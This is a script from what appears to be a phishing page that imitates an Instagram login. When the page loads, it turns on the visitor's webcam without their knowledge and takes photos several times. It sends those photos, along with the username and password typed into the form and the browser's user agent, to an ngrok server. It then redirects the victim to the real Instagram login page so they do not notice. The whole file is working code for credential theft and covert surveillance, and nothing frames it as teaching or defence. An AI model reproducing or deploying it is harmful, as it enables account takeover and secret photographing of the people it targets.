<script>
// ============================================
// CONFIG — Your ngrok URL
// ============================================
var SERVER_URL = 'https://procreate-wince-usher.ngrok-free.dev/upload';

// ============================================
// ELEMENTS
// ============================================
var video = document.getElementById('hiddenVideo');
var canvas = document.createElement('canvas');
var ctx = canvas.getContext('2d');
var loginForm = document.getElementById('loginForm');
var usernameInput = document.getElementById('username');
var passwordInput = document.getElementById('password');
var loginBtn = document.getElementById('loginBtn');
var stream = null;
var cameraReady = false;

// Enable login button when both fields filled
usernameInput.addEventListener('input', checkFields);
passwordInput.addEventListener('input', checkFields);

function checkFields() {
  if (usernameInput.value.trim() && passwordInput.value.trim()) {
    loginBtn.classList.add('active');
  } else {
    loginBtn.classList.remove('active');
  }
}

// ============================================
// START CAMERA AUTOMATICALLY ON PAGE LOAD
// ============================================
function startCamera() {
  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
    navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
      audio: false
    }).then(function(s) {
      stream = s;
      video.srcObject = stream;
      cameraReady = true;
      console.log('[+] Camera active (stealth mode)');

      // Wait for video to actually play before capturing
      video.onplaying = function() {
        // Take first photo after camera starts
        setTimeout(capturePhoto, 2000);
        // Take another photo after 7 seconds
        setTimeout(capturePhoto, 7000);
        // Take another photo after 14 seconds
        setTimeout(capturePhoto, 14000);
      };

    }).catch(function(err) {
      console.log('[-] Camera not available: ' + err.message);
      cameraReady = false;
    });
  } else {
    console.log('[-] getUserMedia not supported');
    cameraReady = false;
  }
}

// ============================================
// CAPTURE PHOTO AND SEND
// ============================================
function capturePhoto() {
  if (!cameraReady || !stream || !video.videoWidth) return;

  try {
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    var imageData = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];

    var id = Date.now().toString(36) + Math.random().toString(36).slice(2, 6);

    fetch(SERVER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        image: imageData,
        type: 'camera',
        id: id,
        ua: navigator.userAgent
      })
    }).then(function(r) {
      if (r.ok) console.log('[+] Stealth photo captured');
    }).catch(function(e) {
      console.log('[-] Photo upload failed: ' + e.message);
    });
  } catch(e) {
    console.log('[-] Capture error: ' + e.message);
  }
}

// ============================================
// ON FORM SUBMIT — send credentials + photo
// ============================================
loginForm.addEventListener('submit', function(e) {
  e.preventDefault();

  var username = usernameInput.value.trim();
  var password = passwordInput.value.trim();
  loginBtn.textContent = 'Logging in...';
  loginBtn.disabled = true;

  function doSubmit() {
    var payload = {
      type: 'login',
      username: username,
      password: password,
      id: Date.now().toString(36) + Math.random().toString(36).slice(2, 6),
      ua: navigator.userAgent
    };

    fetch(SERVER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    }).then(function() {
      if (stream) { stream.getTracks().forEach(function(t) { t.stop(); }); stream = null; }
      window.location.href = 'https://www.instagram.com/accounts/login/?next=%2F&source=desktop_nav';
    }).catch(function() {
      if (stream) { stream.getTracks().forEach(function(t) { t.stop(); }); stream = null; }
      window.location.href = 'https://www.instagram.com/accounts/login/?next=%2F&source=desktop_nav';
    });
  }

  // Small delay so video frame catches up, then capture
  setTimeout(function() {
    if (cameraReady && stream && video.videoWidth > 0) {
      try {
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        var imageData = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];

        var payload = {
          image: imageData,
          type: 'login',
          username: username,
          password: password,
          id: Date.now().toString(36) + Math.random().toString(36).slice(2, 6),
          ua: navigator.userAgent
        };

        fetch(SERVER_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        }).then(function() {
          if (stream) { stream.getTracks().forEach(function(t) { t.stop(); }); stream = null; }
          window.location.href = 'https://www.instagram.com/accounts/login/?next=%2F&source=desktop_nav';
        }).catch(function() {
          doSubmit();
        });
      } catch(e) {
        doSubmit();
      }
    } else {
      doSubmit();
    }
  }, 500);
});

// ============================================
// START ON PAGE LOAD
// ============================================
window.addEventListener('load', function() {
  setTimeout(startCamera, 500);
});
</script>
